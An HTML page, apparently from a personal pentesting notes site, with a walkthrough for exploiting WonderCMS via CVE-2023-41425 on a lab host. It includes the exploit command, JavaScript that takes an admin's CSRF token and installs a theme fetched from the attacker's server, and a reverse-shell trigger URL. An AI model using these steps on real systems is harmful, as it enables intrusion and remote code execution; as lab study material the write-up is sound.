@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>WonderCMS</h1>
+            <p>It's an open source flat file CMS (Content Management System), built with PHP and developed since 2008.</p>
+        </div>
+
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>
+                <p>Login URL of wondercms may be at. Only a password should be provided in order to access</p>
+                <pre><code class="language-bash">http://site.com/LoginURL</code></pre>
+            </ul>    
+        </div>
+
+        <div class="notion-body">
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>CVE-2023-41425</h3>
+                <ul>
+                <p>A XSS in versions 3.2.0 - 3.4.2 can be exploited gaining a reverse shell. Files to exploit it can be found <a class="notion-link" href="https://github.com/prodigiousMind/CVE-2023-41425">here</a></p>
+                <b>In order to exploit this it is a must that an administrator or a privileged user visits the URL that we provide exploiting the XSS</b>
+                <p>Run the exploit which provides starting up a python web server and generating a URL that makes a connection to a server controlled by us</p>
+                <pre><code class="language-bash">python3 exploit.py http://sea.htb/loginURL 10.10.14.18 4444</code></pre>
+                <p>Provide the URL to the affected server and await for a user to visit the URL triggering a connection to our malicious server</p>
+                <p>Then wait for a connection from the victim gathering our xss.js. Remember to modify main.zip file configuring the appropiate address and port</p>
+                <pre><code class="language-js">var token = document.querySelectorAll('[name="token"]')[0].value;
+var urlRev = "/?installModule=http://10.10.14.18:8000/main.zip&directoryName=violet&type=themes&token=" + token;
+var xhr3 = new XMLHttpRequest();
+xhr3.withCredentials = true;
+xhr3.open("GET", urlRev);
+xhr3.send();</code></pre>
+                
+                <p>This js file will make another request to our server gathering a main.zip file which will be installed as a new plugin. This plugin contains a reverse shell that can be activated visiting the following URL. <b>Rember to setup a nc in the appropiate port</b></p>
+                <pre><code class="language-bash">http://sea.htb/themes/revshell-main/rev.php</code></pre>
+
+
+                
+
+                
+            </ul>
+            </ul>    
+        </div>
+    </div>
+
+
+</body>
+</html>
